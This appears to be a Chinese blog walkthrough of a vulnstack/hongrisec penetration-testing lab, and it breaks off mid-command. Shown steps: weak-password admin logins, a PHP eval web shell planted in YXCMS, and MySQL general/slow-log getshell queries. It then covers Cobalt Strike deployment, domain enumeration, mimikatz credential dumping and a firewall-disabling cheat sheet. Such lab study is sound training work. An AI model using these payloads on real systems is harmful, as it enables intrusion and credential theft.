<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>ATK&amp;CK(一) | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!1},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1,share:!0,reward:{enable:!0,img_link:null,text:"谢谢你请我喝咖啡!!!"}},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">ATK&amp;CK(一)</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-10-13 00:00:00</span> <span class="mobile">2023-10-13 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-10-13 16:02:31</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/ATK-CK/">ATK&amp;CK</a>&nbsp;</li><li>| <a href="/tags/hongrisec/">hongrisec</a>&nbsp;</li><li>| <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>4.1k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>16 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><p>靶机下载: <a class="link" target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2">http://vulnstack.qiyuanxuetang.net/vuln/detail/2<i class="fas fa-external-link-alt"></i></a></p><h3 id="环境搭建与网络配置"><a href="#环境搭建与网络配置" class="headerlink" title="环境搭建与网络配置"></a>环境搭建与网络配置</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910220213563.png" alt="image-20230910220213563"></p><h4 id="网路架构图"><a href="#网路架构图" class="headerlink" title="网路架构图:"></a>网路架构图:</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910224418030.png" alt="image-20230910224418030"></p><h4 id="虚拟机网络环境"><a href="#虚拟机网络环境" class="headerlink" title="虚拟机网络环境:"></a>虚拟机网络环境:</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910220815477.png" alt="image-20230910220815477"></p><h4 id="各台机器详细配置"><a href="#各台机器详细配置" class="headerlink" title="各台机器详细配置:"></a>各台机器详细配置:</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910222528999.png" alt="image-20230910222528999"></p><p>登录密码均为<code>hongrisec@2019</code></p><p>配置win7双网卡, 并ping测试</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910230428814.png" alt="image-20230910230428814"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910230756981.png" alt="image-20230910230756981"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230910230404296.png" alt="image-20230910230404296"></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914214516666.png" alt="image-20230914214516666"></p><p>对站点IP使用nmap扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.224.137</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sV Version版本检测扫描</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-p- 全端口扫描</span></span><br></pre></td></tr></table></figure><p>具体<code>nmap</code>使用教程可以参考这一篇<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Kris__zhang/article/details/106841466">https://blog.csdn.net/Kris__zhang/article/details/106841466<i class="fas fa-external-link-alt"></i></a></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914220736796.png" alt="image-20230914220736796"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>这里推荐一下<code>dirmap</code>, 其功能强于DirBuster、Dirsearch、cansina、御剑.</p><p>github下载地址<a class="link" target="_blank" rel="noopener" href="https://codeload.github.com/H4ckForJob/dirmap/zip/master">https://codeload.github.com/H4ckForJob/dirmap/zip/master<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/H4ckForJob/dirmap.git &amp;&amp; <span class="built_in">cd</span> dirmap &amp;&amp; python3 -m pip install -r requirement.txt</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 单个目标</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 dirmap.py -iU https://site.com -lcf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多个目标</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 dirmap.py -iF urls.txt -lcf</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirmap.py -i http://192.168.224.137 -lcf</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914222516428.png" alt="image-20230914222516428"></p><p>看到有个备份文件, 下载查看<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914224515971.png" alt="image-20230914224515971"></p><p>有个<code>robots.txt</code></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914224553413.png" alt="image-20230914224553413"></p><p>主站为: <code>http://192.168.224.137/YXCMS/</code></p><p>这里还有<code>phpMyAdmin</code>登录地址<code>http://192.168.224.137/phpMyAdmin/</code></p><p>phpinfo泄露地址<code>http://192.168.224.137/phpinfo.php</code></p><p>访问主站发现开发遗留的若只问题<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914225012142.png" alt="image-20230914225012142"></p><p>访问phpinfo()</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914230341757.png" alt="image-20230914230341757"></p><p>这里暴露了绝对地址</p><h3 id="web漏洞利用"><a href="#web漏洞利用" class="headerlink" title="web漏洞利用"></a>web漏洞利用</h3><h4 id="后台弱口令"><a href="#后台弱口令" class="headerlink" title="后台弱口令"></a>后台弱口令</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914231049204.png" alt="image-20230914231049204"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.224.137/YXCMS/index.php?r=admin/index/login</span><br><span class="line">账号:admin</span><br><span class="line">密码:123456</span><br></pre></td></tr></table></figure><p>成功登录</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914230935001.png" alt="image-20230914230935001"></p><h4 id="后台写入shell文件"><a href="#后台写入shell文件" class="headerlink" title="后台写入shell文件"></a>后台写入shell文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914232336618.png" alt="image-20230914232336618"></p><p>保存, 然后从我们最开始下载的备份文件里, 可以找到shell.php的路径; 这里随便搜一个前台模板文件, 看一下路径</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914233354080.png" alt="image-20230914233354080"></p><p>可以复制出路径<code>protected/apps/default/view/default/photo_content.php</code></p><p>测试一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.224.137/YXCMS/protected/apps/default/view/default/shell.php</span><br><span class="line">6=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914233524225.png" alt="image-20230914233524225"></p><p>连接蚁剑成功</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230914233823459.png" alt="image-20230914233823459"></p><h4 id="前台存储型XSS"><a href="#前台存储型XSS" class="headerlink" title="前台存储型XSS"></a>前台存储型XSS</h4><p>观察网站主站, 发现有个留言本功能, 尝试xss. 成功</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915164533378.png" alt="image-20230915164533378"></p><p>登录后台, 打开留言本, 成功弹出cookie, xss利用成功</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915164328340.png" alt="image-20230915164328340"></p><p>这里重点不在于代码审计, 所以更多关于这个<code>YXcms</code>的web漏洞可以参考这篇文章<a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/column/162886.html">https://www.freebuf.com/column/162886.html<i class="fas fa-external-link-alt"></i></a></p><h4 id="phpMyAdmin弱口令-数据库日志getshell"><a href="#phpMyAdmin弱口令-数据库日志getshell" class="headerlink" title="phpMyAdmin弱口令+数据库日志getshell"></a>phpMyAdmin弱口令+数据库日志getshell</h4><h5 id="弱口令登录"><a href="#弱口令登录" class="headerlink" title="弱口令登录"></a>弱口令登录</h5><p>在最开始扫描中, 我们就发现了这个界面, 现在我们尝试登录</p><p>账号密码都是 <code>root</code>, 成功登录</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915175110511.png" alt="image-20230915175110511"></p><h5 id="写入文件getshell-失败"><a href="#写入文件getshell-失败" class="headerlink" title="写入文件getshell(失败)"></a>写入文件getshell(失败)</h5><p>这里可以执行sql语句, 虽然我们也无法确定当前是否开了写文件的权限, 我们可以直接写入试试就知道了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_REQUEST[6]); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915180851190.png" alt="image-20230915180851190"></p><p>执行失败, 并且从翻译中可以看出, 是没有权限, 那么我们可以尝试开启这个权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure%&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> secure_file_priv<span class="operator">=</span><span class="string">&#x27;ON&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915221204417.png" alt="image-20230915221204417"></p><p>但是没有修改权限</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915221433551.png" alt="image-20230915221433551"></p><h5 id="全局日志getshell"><a href="#全局日志getshell" class="headerlink" title="全局日志getshell"></a>全局日志getshell</h5><p>尝试数据库全局日志写入</p><p>先查询是否有权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915223623024.png" alt="image-20230915223623024"></p><p>权限为<code>off</code>, 尝试修改权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="string">&#x27;ON&#x27;</span>;</span><br></pre></td></tr></table></figure><p>成功修改<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915223728539.png" alt="image-20230915223728539"></p><p>然后把<code>general_log</code>日志路径放网站根目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log_file&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915223940998.png" alt="image-20230915223940998"></p><p>访问查看, 可以发现日志能够记录我们执行的sql语句<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915224056514.png" alt="image-20230915224056514"></p><p>现在尝试写入一句话木马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_REQUEST[6]); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915224237137.png" alt="image-20230915224237137"></p><p>测试一下, 成功</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915224315977.png" alt="image-20230915224315977"></p><h5 id="慢查询日志getshell"><a href="#慢查询日志getshell" class="headerlink" title="慢查询日志getshell"></a>慢查询日志getshell</h5><p>下面试一下数据库慢查询日志写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;slow%&#x27;</span> </span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915225025442.png" alt="image-20230915225025442"></p><p>与上述一样, 可以把时间修改的小一些</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file<span class="operator">=</span>&quot;C:/phpStudy/WWW/shell2.php&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> Long_query_time<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;slow%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915225237369.png" alt="image-20230915225237369"></p><p>写入一句话木马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_REQUEST[666]); ?&gt;&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915233354030.png" alt="image-20230915233354030"></p><h5 id="错误日志getshell-失败"><a href="#错误日志getshell-失败" class="headerlink" title="错误日志getshell(失败)"></a>错误日志getshell(失败)</h5><p>先查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%error%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915233935521.png" alt="image-20230915233935521"></p><p>为空, 我们直接写入错误日志文件位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> log_error <span class="operator">=</span> <span class="string">&#x27;C:/phpStudy/WWW/shell3.php&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_error&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230915234055550.png" alt="image-20230915234055550"></p><h3 id="内网搜集"><a href="#内网搜集" class="headerlink" title="内网搜集"></a>内网搜集</h3><p>首先我们准备好<code>cobaltstrike</code></p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>搭建cs服务端</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919191339866.png" alt="image-20230919191339866"></p><p>启动cs</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919191431061.png" alt="image-20230919191431061"></p><p>我们用cs生成一个大马</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919192447766.png" alt="image-20230919192447766"></p><p>通过蚁剑上传到服务器</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919193407657.png" alt="image-20230919193407657"></p><p>运行一下, 才能cs上线<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919194007808.png" alt="image-20230919194007808"></p><p>这里为了提高效率, 我们直接把延时调到0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 0</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919194859192.png" alt="image-20230919194859192"></p><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><p>收集端口信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919202215249.png" alt="image-20230919202215249"></p><p>查看系统信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919211902939.png" alt="image-20230919211902939"></p><p>同时拿到内网ip</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919212049502.png" alt="image-20230919212049502"></p><p>查看是否有域以及当前域</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919212754786.png" alt="image-20230919212754786"></p><p>查看域内所有用户列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919223707325.png" alt="image-20230919223707325"></p><p>直接操作失败, 这里需要提权</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919223802685.png" alt="image-20230919223802685"></p><p>成功后, 继续操作</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919224016272.png" alt="image-20230919224016272"></p><p>查看域成员计算机列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919224341937.png" alt="image-20230919224341937"></p><p>本机计算机名字为 STU1，另外还有两个域用户分别是 DEV1、ROOT-TVI862UBEH</p><p>查看域管理员用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230919225247908.png" alt="image-20230919225247908"></p><p>域控用户名为<code>OWA</code></p><p>使用<a class="link" target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">lodan<i class="fas fa-external-link-alt"></i></a>扫描内网网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.52.0/24 OnlinePC</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230920222646242.png" alt="image-20230920222646242"></p><p>再用mimikatz抓一下密码，得到当前用户登录密码为<code>hongrisec@2019</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230920224025035.png" alt="image-20230920224025035"></p><p>这里汇总一下信息收集的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line">关闭防火墙</span><br><span class="line"></span><br><span class="line">shell netstat -ano</span><br><span class="line">查看开放端口</span><br><span class="line"></span><br><span class="line">shell systeminfo</span><br><span class="line">查看系统信息</span><br><span class="line"></span><br><span class="line">shell ipconfig/all</span><br><span class="line">查看网络信息</span><br><span class="line"></span><br><span class="line">shell whoami</span><br><span class="line">查看用户信息</span><br><span class="line"></span><br><span class="line">shell whoami/all</span><br><span class="line">查看所有用户信息</span><br><span class="line"></span><br><span class="line">shell hostname</span><br><span class="line">获取dns信息</span><br><span class="line"></span><br><span class="line">shell net view</span><br><span class="line">查看当前局域网中的计算机列表</span><br><span class="line"></span><br><span class="line">shell net user</span><br><span class="line">查看当前计算机中的用户</span><br><span class="line"></span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br><span class="line">查询操作系统及软件信息</span><br><span class="line"></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line">查看系统体系结构</span><br><span class="line"></span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</span><br><span class="line">使用PowerShell收集软件的版本信息</span><br><span class="line"></span><br><span class="line">whoami &amp;&amp; whoami /priv</span><br><span class="line">查看当前权限</span><br><span class="line"></span><br><span class="line">wmic service list brief</span><br><span class="line">查询本机服务信息</span><br><span class="line"></span><br><span class="line">wmic product get name, version </span><br><span class="line">查看安装的软件的版本、路径等</span><br><span class="line"></span><br><span class="line">wmic process list brief</span><br><span class="line">查询进程信息</span><br><span class="line"></span><br><span class="line">wmic startup get command,caption</span><br><span class="line">查看启动程序信息</span><br><span class="line"></span><br><span class="line">shell tasklist</span><br><span class="line">查看常见的杀毒软件进程</span><br><span class="line"></span><br><span class="line">shell net view /domain</span><br><span class="line">查看主域信息</span><br><span class="line"></span><br><span class="line">shell net time 